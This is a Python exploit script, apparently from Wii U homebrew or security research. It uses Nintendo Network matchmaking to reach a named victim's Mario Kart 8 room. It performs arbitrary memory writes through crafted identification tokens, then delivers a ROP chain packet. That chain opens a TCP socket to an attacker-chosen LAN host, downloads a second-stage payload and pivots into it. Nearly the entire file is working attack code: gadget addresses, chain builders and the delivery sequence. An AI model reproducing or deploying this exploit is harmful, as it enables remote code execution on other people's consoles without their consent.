from nintendo.nex import backend, authentication, matchmaking, account
from nintendo.pia.station import IdentificationInfo
from nintendo.pia.session import PIASession
from nintendo.account import AccountAPI
from nintendo.games import MK8
import struct
import time


# 80 61 00 08 80 81 00 0C 80 01 00 14 7C 08 03 A6 38 21 00 10 4E 80 00 20
# 80 A1 00 08 38 21 00 10 7C A3 2B 78 80 81 00 04 7C 88 03 A6 4E 80 00 20

# 80 C1 00 14 90 61 00 10 80 01 00 10 91 5E 00 2C 81 21 00 08 90 1E 00 30 91 3E 00 28 90 DE 00 34 80 01 00 34 83 E1 00 2C 7C 08 03 A6 83 C1 00 28 38 21 00 30 4E 80 00 20
# 80 1F 00 00 7C 09 03 A6 4E 80 04 21 83 FF 00 04 2C 1F 00 00 40 82 FF EC 80 01 00 14 83 E1 00 0C 7C 08 03 A6 38 21 00 10 4E 80 00 20
# 0x02000850 = pop r30, r31
# 0x02A5D698 = pop r3, r4, r26

ROP_POPJUMPLR_STACK12 = 0x0101CD24
ROP_POPJUMPLR_STACK20 = 0x01024D88
ROP_CALLFUNC = 0x01080274
ROP_CALLR28_POP_R28_TO_R31 = 0x0107DD70
ROP_POP_R28R29R30R31 = 0x0101D8D4
ROP_POP_R27 = 0x0101CB00
ROP_POP_R24_TO_R31 = 0x010204C8
ROP_CALLFUNCPTR_WITHARGS_FROM_R3MEM = 0x010253C0
ROP_SETR3TOR31_POP_R31 = 0x0101CC10
ROP_Register = 0x010277B8
ROP_CopyToSaveArea = 0x010277DC
ROP_memcpy = 0x01035FC8
ROP_DCFlushRange = 0x01023F88
ROP_ICInvalidateRange = 0x010240B0
ROP_OSSwitchSecCodeGenMode = 0x010376C0
ROP_OSCodegenCopy = 0x010376D8
ROP_OSGetCodegenVirtAddrRange = 0x010375C0
ROP_OSGetCoreId = 0x01024E8C
ROP_OSGetCurrentThread = 0x01043150
ROP_OSSetThreadAffinity = 0x010429DC
ROP_OSYieldThread = 0x010418E4
ROP_OSFatal = 0x01031618
ROP_Exit = 0x0101CD80
ROP_OSScreenFlipBuffersEx = 0x0103AFD0
ROP_OSScreenClearBufferEx = 0x0103B090
ROP_OSDynLoad_Acquire = 0x0102A3B4
ROP_OSDynLoad_FindExport = 0x0102B828
ROP_os_snprintf = 0x0102F160
ROP_GX2Init = 0x01156B78
ROP_GX2Flush = 0x011575AC
ROP_GX2WaitForVsync = 0x01151964
ROP_GX2DirectCallDisplayList = 0x01152BF0

ROP_Restart = 0x02019A80 - 0xFE3C00
ROP_OSDriver_Register = 0x010277B8
ROP_OSDriver_Deregister = 0x010277C4
ROP_OSDriver_CopyFromSaveArea = 0x010277D0
ROP_OSDriver_CopyToSaveArea = 0x010277DC
ROP_OSBlockMove = 0x02019EE4 - 0xFE3C00
ROP_OSExitThread = 0x0202596C - 0xFE3C00 
ROP_memset = 0x02019BB4 - 0xFE3C00
ROP_memclr = 0x02019BBC - 0xFE3C00
ROP_OSSendAppSwitchRequest = 0x0201D830 - 0xFE3C00
ROP_Syscall_0x01 = 0x02014A5C - 0xFE3C00

# coreinit init 0x0200890C = pop r5

#0x04		rop2[0x164/4] = r6load_addr;
#0x08		rop2[0x168/4] = 0; # r9 ici
#0x0C		rop2[0x16c/4] = 0;
#0x10		rop2[0x170/4] = 0; # r3 stocker ici | r0 = r3
#0x14		rop2[0x174/4] = 4; # r6
#0x18		rop2[0x178/4] = 0;
#0x1C		rop2[0x17C/4] = 0;
#0x20		rop2[0x180/4] = 0;
#0x24		rop2[0x184/4] = 0;
#0x28		rop2[0x188/4] = 0;
#0x2C		rop2[0x18c/4] = stack2 + 0x1c0; # r31 -> ptr to function
#0x30		rop2[0x190/4] = 0;
#0x04		rop2[0x194/4] = sigwait_addr; # lr


#hex(0x02000020 + (0xa5dde4 - 0x76C))
#hex(0x02000000 + (0x8C10 - 0x304))


def _byteswap_long(i):
    return struct.unpack("<I", struct.pack(">I", i))[0]


# A packet may contain more than 1000 bytes,
# enough room to build a nice ROP chain
rop_payload = [
	0,
	0, 
	0,
	0,
	0,
	0,
	0,
	0,
	0,

]

def ropgen_setr3(r3=0, r4=0):
	rop_payload.append(0x0110C904)
	rop_payload.append(r3)
	rop_payload.append(r4) # r4
	rop_payload.append(r4)

def tiny_call(fptr, r3=0, r4=0):
	ropgen_setr3(r3, r4)
	rop_payload.append(ROP_POP_R28R29R30R31)
	rop_payload.append(fptr)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(r4)
	rop_payload.append(0)
	rop_payload.append(ROP_CALLR28_POP_R28_TO_R31)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(0)

def call_noargs(fptr):
	rop_payload.append(ROP_POP_R28R29R30R31)
	rop_payload.append(fptr)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(ROP_CALLR28_POP_R28_TO_R31)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(0)

def ropgen_write_r3r4_tomem(outaddr):

	rop_payload.append(ROP_POP_R28R29R30R31)
	rop_payload.append(ROP_OSGetCodegenVirtAddrRange + 0x20)
	rop_payload.append(0)
	rop_payload.append(outaddr)
	rop_payload.append(0x10000000)
	rop_payload.append(0)
	rop_payload.append(ROP_CALLR28_POP_R28_TO_R31)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(0)

def write32(addr, value):

	ropgen_setr3(value)
	ropgen_write_r3r4_tomem(addr)

def new_tiny_call(addr, arg_ptr, arg2):
	# now we can set r3
	ropgen_setr3(arg_ptr,0)

	  
	rop_payload.append(0x2024858 - 0xFE3C00)# #0x2024858 r3 = *r3 # lwz r3, 0(r3); lwz r0, 0xc(r1); mtlr r0; addi r1, r1, 8; blr; 
	rop_payload.append(0x00001234) # + 8

	# set func address to r28, arg2 to r31
	rop_payload.append(ROP_POP_R28R29R30R31) # coreinit.rpl 0x020014d4: lwz r28, 8(r1); lwz r29, 0xc(r1); lwz r0, 0x1c(r1); lwz r30, 0x10(r1); mtlr r0; lwz r31, 0x14(r1); addi r1, r1, 0x18; blr; 
	rop_payload.append(addr) # r28 + 8
	rop_payload.append(0x00001235)     # r29 +0x0C
	rop_payload.append(0x00001236)    # r30+ 0x10
	rop_payload.append(arg2) # r31 + 0x14 
	rop_payload.append(0x00001237)     # + 0x18
	        
	# r31 will be moved to r4
	rop_payload.append(ROP_CALLR28_POP_R28_TO_R31) # coreinit: 0x02061970: mtctr r28; mr r4, r31; bctrl; lwz r28, 8(r1); lwz r29, 0xc(r1); lwz r0, 0x1c(r1); lwz r31, 0x14(r1); mtlr r0; lwz r30, 0x10(r1); addi r1, r1, 0x18; blr; 
	rop_payload.append(0x00001238)      # r28 + 8
	rop_payload.append(0x00001239)      # r29 + 0xC
	rop_payload.append(0x0000123A)      # r30 + 0x10
	rop_payload.append(0x0000123B)      # r31 + 0x14
	rop_payload.append(0x0000123C)      # + 0x18


def new_call(addr, arg_ptr, arg2, arg3, arg4, arg5):  
	# set r3 to arg5
	ropgen_setr3(arg5,0)
	# move it to r7
	rop_payload.append(0xC180000 + 0x028036ec)#0x028036ec: mr r7, r3; lwz r0, 0xc(r1); mtlr r0; addi r1, r1, 8; mr r3, r7; blr; 
	rop_payload.append(0x0000DEA2)# ;r1 +8    

	# set r3 to arg3
	ropgen_setr3(arg4,0)
	# move it to r11
	rop_payload.append(0xC180000 + 0x029002ac) #0x029002ac: mr r11, r3; lwz r0, 0xc(r1); mtlr r0; addi r1, r1, 8; mr r3, r11; blr; 
	rop_payload.append(0x0000DEA6)# ;r1 + 8
	# then we can move it to r6
	rop_payload.append(0xC180000 + 0x029dd8fc) # 0x029dd8fc: mr r6, r11; lwz r0, 0x14(r1); mtlr r0; addi r1, r1, 0x10; clrlwi r3, r6, 0x18; blr; 
	rop_payload.append(0x0000DEA7)# ;r1 + 8
	rop_payload.append(0x0000DEA8)# ;r1 + 0xC
	rop_payload.append(0x0000DEA9)# ;r1 + 0x10

	# set arg3 to r3
	ropgen_setr3(arg3,0)  
	# move it to r5
	rop_payload.append(0xC180000 + 0x0211cb44) # : 0x0211cb44 mr r5, r3; lwz r0, 0x14(r1); mtlr r0; addi r1, r1, 0x10; mr r3, r5; blr; 
	rop_payload.append(0x0000DEAA)# ;r1 + 8
	rop_payload.append(0x0000DEAB)# ;r1 + 0xC
	rop_payload.append(0x0000DEAC)# ;r1 + 0x10

	new_tiny_call(addr, arg_ptr, arg2)



def make_pm4_type3_packet_header(opcode, count):

	hdr = 0
	hdr |= (3 << 30)
	hdr |= ((count-1) << 16)
	hdr |= (opcode << 8)		

	return hdr

def pop_r24_to_r31(inputregs):

	rop_payload.append(ROP_POP_R24_TO_R31)
	rop_payload.append(0)
	rop_payload.append(0)

	for i in range(0, 8):
		rop_payload.append(inputregs[i])

	rop_payload.append(0)

def call_func(funcaddr, r3=0, r4=0, r5=0, r6=0, r28=0):

	input_regs = 	[r6,
					r5,
					0,
					ROP_CALLR28_POP_R28_TO_R31,
					funcaddr,
					r3,
					0,
					r4]

	pop_r24_to_r31(input_regs)

	rop_payload.append(ROP_CALLFUNC)
	rop_payload.append(r28)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(0)


def calc_addr(idx):
	return (0x387D36AC + ((idx - 9) *4))

def sysapp_to_realaddr(addr):
	return addr + (0x0EED81C0 - 0x02000000)



def doBL(dst, src):
	newval = (dst - src)
	newval &= 0x03FFFFFC
	newval |= 0x48000001
	return newval

def userspace_to_kheap_index(addr):
  return (0x10000000 + ((addr - 0xFF200014)//16))

def OSFatal(text_addr):
	tiny_call(ROP_OSFatal, text_addr)

def DCFlushRange(addr, size):
	tiny_call(ROP_DCFlushRange, addr, size)

def GX2DirectCallDisplayList(addr, size):
	tiny_call(ROP_GX2DirectCallDisplayList, addr, size)

def GX2Flush():
	tiny_call(ROP_GX2Flush)

def OSDriver_Register(name_addr, name_size):
	call_func(ROP_OSDriver_Register, name_addr, name_size, 0, 0)

def OSDriver_CopyToSaveArea(name_addr, name_size, in_buffer, buffer_size):
	call_func(ROP_OSDriver_CopyToSaveArea, name_addr, name_size, in_buffer, buffer_size)

def OSSendAppSwitchRequest(rampid, arg1, arg2):
	call_func(ROP_OSSendAppSwitchRequest, rampid, arg1, arg2)

def StackPivot(new_stack):

	# set r3 to $arg3
	ropgen_setr3(new_stack);
	# move it to r11
	rop_payload.append(0xC180000 + 0x029002ac) #0x029002ac: mr r11, r3; lwz r0, 0xc(r1); mtlr r0; addi r1, r1, 8; mr r3, r11; blr; 
	rop_payload.append(0x0000DEA6) # ;r1 + 8
	rop_payload.append(0xC180000 + 0x02a645b0) # ;r1 + 12 # lwz r0, 4(r11); mtlr r0; mr r1, r11; blr; 


def OSCreateThread(thread, entry, argc, argv, stack, stackSize, priority, attributes):

	inputregs = [1, 2, 3, 4, 5, 6, 7, 8]
	inputregs[24 - 24] = 0 # #r24
	inputregs[25 - 24] = stack # #r25 # r7
	inputregs[26 - 24] = stackSize # #r26 # r8
	inputregs[27 - 24] = priority # #r27 # r9
	inputregs[28 - 24] = thread # #r28 #r3
	inputregs[29 - 24] = entry # #r29 #r4
	inputregs[30 - 24] = argc ##r30 #r5
	inputregs[31 - 24] = argv # #r31 # r6
	pop_r24_to_r31(inputregs)

	rop_payload.append(0x020257a8 - 0xFE3C00)
	rop_payload.append(2) # param #10 ;r1 +8
	rop_payload.append(attributes << 16) # r10 ;r1 +12 (lhz from this register)
	rop_payload.append(0) # ;r1 +16
	rop_payload.append(0) # r25 ;r1 +20
	rop_payload.append(0) # r26 ;r1 +24
	rop_payload.append(0) # r27 ;r1 +28
	rop_payload.append(0) # r28 ;r1 +32
	rop_payload.append(0) # r29 ;r1 +36
	rop_payload.append(0) # r30 ;r1 +40
	rop_payload.append(0) # r31 ;r1 +44 (0x2C)
	rop_payload.append(0)  


# ROP CHAIN -------------------------------------------------------------------

#
# you can use all of the function above
# even GX2 ones and OSDriver syscalls
# 5.5.x address
# 
# this example rop chain will write data to memory
# register an OSDriver
# OSFatal with a modified string
#
# write32 is very memory intensive
# rather append it to the rop chain and calculate the addr
#
# call_func is also memory intensive
# use tiny_call for <= 2 argument functions
#

# OSCreateThread(thread, entry, argc, argv, stack, stackSize, priority, attributes)
# new_call(addr, arg_ptr, arg2, arg3, arg4)

AF_INET = 2
SOCK_STREAM = 1
IPPROTO_TCP = 6

new_rop_index = 100
socket_stuff_idx = 177

def to_sysnet_addr(addr):
	return 0x10BFD80 + addr

DCFlushRange(calc_addr(-9), 0x500)

# Create thread
OSCreateThread(0x4D066000, ROP_POP_R24_TO_R31, 0, 0, 0x4D070000, 0x8000, 0, 2 | 8)

# change thread r1 so we jump to our ROP Chain

call_func(ROP_memcpy, 0x4D070000 + 0x14, calc_addr(new_rop_index), 0x400)
DCFlushRange(0x4D066000, 0x20000)

# osresumethread
tiny_call(0x02025D08 - 0xFE3C00, 0x4D066000)

rop_payload.append(ROP_OSExitThread) # 0x01041D6C

# socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
call_func(to_sysnet_addr(0x2448), AF_INET, SOCK_STREAM, IPPROTO_TCP, 0)

# connect(socket_fd, &sin, 0x10)
call_func(to_sysnet_addr(0xAA8), 4, 0x4D070000 + 0x14 + ((socket_stuff_idx - new_rop_index) * 4), 0x10, 0)

# recv(rpc, (char*)0x1000003C, 0x100, 0)
call_func(to_sysnet_addr(0xD6C), 4, 0x4D120000, 0x1000, 0)

DCFlushRange(0x4D120000, 0x1000)
StackPivot(0x4D120000)

# sin.family + port
rop_payload.append(0x00020000 + 12345)
rop_payload.append( (192<<24) | (168<<16) | (1<<8) | (52<<0) )
rop_payload.append(0)
rop_payload.append(0)


# end of ROP CHAIN -------------------------------------------------------------------

for i in range(len(rop_payload)):
	print("%3d: %08X" %(i,rop_payload[i]))

print("")
print(rop_payload.index(0x01041D6C) + 1)
print(rop_payload.index(0x00020000 + 12345))

input()

#
# This is to get the index if you want to store data at the end of the rop chain
# 
# e.g: "214: 41ADEF48"
#
# and you need the pointer of this value for whatever reason
# you stop the program and
#
# calc_addr(214) will return the ptr of your value
# this can be used to store strings or PM4 packets ;)
# then call "osfatal" or "gx2directcalldisplaylist" with the ptr
#


for i in range(256 - len(rop_payload)):
	if i >= 0:
		rop_payload.append(0xF5A5A5A5)

# real code

#Device id can be retrieved with a call to MCP_GetDeviceId(int mcp_fd, uint32_t *out_device_id) on the Wii U
#Serial number can be found on the back of the Wii U
DEVICE_ID = 1234567890
SERIAL_NUMBER = "GEF100XYXYXY"
SYSTEM_VERSION = 0x0250
REGION = 4 #EUR
COUNTRY = "FR"

USERNAME = "NexoLeBossPutain" #Nintendo network id
PASSWORD = "my_password" #Nintendo network password

FRIEND_NAME = "Rambo6Glaz" # victim nintendo network id (both cannot be the same, otherwise you'll get kicked once the python client connects)

# Log in on account server
api = AccountAPI()
api.set_device(DEVICE_ID, SERIAL_NUMBER, SYSTEM_VERSION, REGION, COUNTRY)
api.set_title(MK8.TITLE_ID_EUR, MK8.LATEST_VERSION)
api.login(USERNAME, PASSWORD)

my_pid = api.get_pid(USERNAME)
friend_pid = api.get_pid(FRIEND_NAME)

mii_name = api.get_mii(my_pid).name

# Connect to game server
nex_token = api.get_nex_token(MK8.GAME_SERVER_ID)
backend = backend.BackEndClient(MK8.ACCESS_KEY, MK8.NEX_VERSION)
backend.connect(nex_token.host, nex_token.port)
backend.login(
	nex_token.username, nex_token.password
)

matchmake_ext = matchmaking.MatchmakeExtensionClient(backend)

# 0x387E0A1C - 0x387E0640

# Find friend room
playing_sessions = matchmake_ext.get_playing_session([friend_pid])
if not playing_sessions:
	raise RuntimeError("Couldn't find friend room for %s" %FRIEND_NAME)

gathering = playing_sessions[0].gathering

# Request session key (for p2p)
session_key = matchmake_ext.join_matchmake_session(
	gathering.id, "This is NintendoClients"
)



matchmaker = matchmaking.MatchMakingClient(backend)
session_urls = matchmaker.get_session_urls(gathering.id)

# Constructs an indentification token that writes
# an arbitrary value at an arbitrary address
# Constructs an indentification token that writes
# an arbitrary value at an arbitrary address
def write(addr, value):
	func = 0xE8A26D4
	dummy = 0xAAAAAAAA
	strbuf = 0x386043D8
	vtable = 0x386042D4
	return struct.pack(
		">IIIIIIII", addr - 0xC, func, dummy,
		dummy, strbuf, vtable, dummy, value
	)


# The ability to write an arbitrary value at an arbitrary address is
# a powerful tool. It's easy to patch a virtual function for example:
# you simply need to overwrite its function pointer in its vtable.
# I'll briefly explain how this exploit turns this into a ROP chain.
#
# Md5Context::GetHashSize is called when the console checks the signature
# of an incoming packet, and when it appends a signature to an outgoing
# packet. Although GetHashSize doesn't take any parameters, r4 always
# contains the content of the packet when it is called, and r5 contains
# the size of the packet. This exploit redirects Md5Context::GetHashSize
# to the following piece of code:
#     ...
#     addi r3, r1, 8
#     bl memcpy
#     ...
# The next packet we send to the console after patching Md5Context::GetHashSize
# will be copied onto the stack, and the ROP chain starts as soon as
# Md5Context::GetHashSize returns.
#
# There are two issues with this approach:
#    - The console may try to send a packet before it receives our ROP packet
#    - The console might receive a packet from someone else before it receives
#      our ROP packet
# Both cases cause a normal packet to be copied onto the stack and crash
# the console. This exploit works around the first issue by patching
# StationPacketHandler::AssignPacket to always return 0. This stops the
# console from trying to send any packets. The second issue is the reason
# that this exploit only works when there are no other players in the
# friend room.

injections = [
	(0x1066f9b8, 0xEBC0314), #StationPacketHandler::AssignPacket -> return 0
	(0x1066889c, 0xEBE6624)  #Md5Context::GetHashSize -> memcpy on stack
]
	
# Create a packet with a valid header but whose body contains a ROP chain
rop_packet = b"\x32\xAB\x98\x64\x01\x00\x00\x00"
rop_packet += struct.pack(">%iI" %len(rop_payload), *rop_payload)

# Initialize P2P session
session = PIASession(backend, session_key)
session.start(
	write(*injections[0]), #Identification token that performs the first injection
	mii_name
)

# Because we won't receive any packets from the console after patching
# StationPacketHandler::AssignPacket, we need to guess what the console
# expects.

# Send a packet that 'expects' an acknowlegement
# but don't wait for the acknowlegement
def send_with_ack(station, message):
	ack_id = next(session.resending_transport.ack_id) & 0xFFFFFFFF
	message.payload += struct.pack(">I", ack_id)
	session.transport.send(station, message)

# Connect to session host
host = session.connect_to_host(session_urls)
session.resending_transport.send = send_with_ack
session.mesh_protocol.send_join_request(host) #First injection
time.sleep(1) #Wait for join response

# Replace identification token for second memory injection
session.station.identification_info = \
	IdentificationInfo(write(*injections[1]), mii_name)

# From now on we won't receive any packets from the console so
# we have to do things manually.

# Disconnect and reconnect to host
session.station_protocol.send_disconnection_request(host)
session.station_protocol.send_connection_request(host)
time.sleep(0.1)
ack_id = next(session.resending_transport.ack_id) & 0xFFFFFFFF
session.station_protocol.send_ack(host, struct.pack(">I", ack_id))
session.station_protocol.send_connection_response(host)
time.sleep(0.1)
ack_id = next(session.resending_transport.ack_id) & 0xFFFFFFFF
session.station_protocol.send_ack(host, struct.pack(">I", ack_id))
time.sleep(1)

# Send join request, performing the second memory injection
session.mesh_protocol.send_join_request(host)
time.sleep(1)

# Finally, send packet with ROP chain
session.transport.transport.socket.send(rop_packet, host.address)

# Disconnect from game server
backend.close()